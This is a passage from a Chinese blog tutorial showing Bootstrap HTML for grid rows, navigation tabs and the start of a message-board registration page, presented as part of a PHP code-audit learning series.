class="token punctuation">=</span><span class="token punctuation">"</span>row<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-md-1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token punctuation">.</span>col<span class="token operator">-</span>md<span class="token number">-1</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-md-1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token punctuation">.</span>col<span class="token operator">-</span>md<span class="token number">-1</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-md-1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token punctuation">.</span>col<span class="token operator">-</span>md<span class="token number">-1</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-md-1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token punctuation">.</span>col<span class="token operator">-</span>md<span class="token number">-1</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-md-1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token punctuation">.</span>col<span class="token operator">-</span>md<span class="token number">-1</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-md-1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token punctuation">.</span>col<span class="token operator">-</span>md<span class="token number">-1</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-md-1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token punctuation">.</span>col<span class="token operator">-</span>md<span class="token number">-1</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-md-1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token punctuation">.</span>col<span class="token operator">-</span>md<span class="token number">-1</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-md-1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token punctuation">.</span>col<span class="token operator">-</span>md<span class="token number">-1</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-md-1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token punctuation">.</span>col<span class="token operator">-</span>md<span class="token number">-1</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-md-1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token punctuation">.</span>col<span class="token operator">-</span>md<span class="token number">-1</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-md-1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token punctuation">.</span>col<span class="token operator">-</span>md<span class="token number">-1</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>row<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-md-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token punctuation">.</span>col<span class="token operator">-</span>md<span class="token number">-8</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-md-4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token punctuation">.</span>col<span class="token operator">-</span>md<span class="token number">-4</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>row<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-md-4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token punctuation">.</span>col<span class="token operator">-</span>md<span class="token number">-4</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-md-4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token punctuation">.</span>col<span class="token operator">-</span>md<span class="token number">-4</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-md-4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token punctuation">.</span>col<span class="token operator">-</span>md<span class="token number">-4</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>row<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-md-6<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token punctuation">.</span>col<span class="token operator">-</span>md<span class="token number">-6</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-md-6<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token punctuation">.</span>col<span class="token operator">-</span>md<span class="token number">-6</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201030211048287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="导航"><a href="#导航" class="headerlink" title="导航"></a>导航</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>测试css<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./js/jquery-3.5.1.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./js/bootstrap.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./js/bootstrap.min.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        div<span class="token punctuation">{</span>            border<span class="token punctuation">:</span> 1px red solid<span class="token punctuation">;</span>            margin<span class="token operator">-</span>top<span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>            margin<span class="token operator">-</span>bottom<span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span></span>php代码审计学习<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>nav nav-tabs<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">role</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>presentation<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>active<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>Home<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">role</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>presentation<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>Profile<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">role</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>presentation<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>Messages<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>效果还是不错的</p><h3 id="实现留言板注册界面"><a href="#实现留言板注册界面" class="headerlink" title="实现留言板注册界面"></a>实现留言板注册界面</h3><p>先看效果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201030222501286.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>源码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./js/jquery-3.5.1.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./js/bootstrap.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./js/bootstrap.min.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>留言板<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>nav</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navbar navbar-default<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>container-fluid<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token comment" spellcheck="true">&lt;!-- Brand and toggle get grouped for better mobile display --></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navbar-header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navbar-brand<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>留言板<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token comment" spellcheck="true">&lt;!-- Collect the nav links, forms, and other content for toggling --></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>collapse navbar-collapse<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bs-example-navbar-collapse-1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>nav navbar-nav<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>我来留言<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>                  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span></span>      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navbar-form navbar-right<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>form-group<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>form-control<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Search<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>btn btn-default<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>搜留言<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span></span>      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token comment" spellcheck="true">&lt;!-- /.navbar-collapse --></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token comment" spellcheck="true">&lt;!-- /.container-fluid --></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>nav</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>row<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-md-4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-md-4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>legend</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text-center<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>用户注册<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>legend</span><span class="token punctuation">></span></span></span>      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>form-horizontal<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>form-group<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> 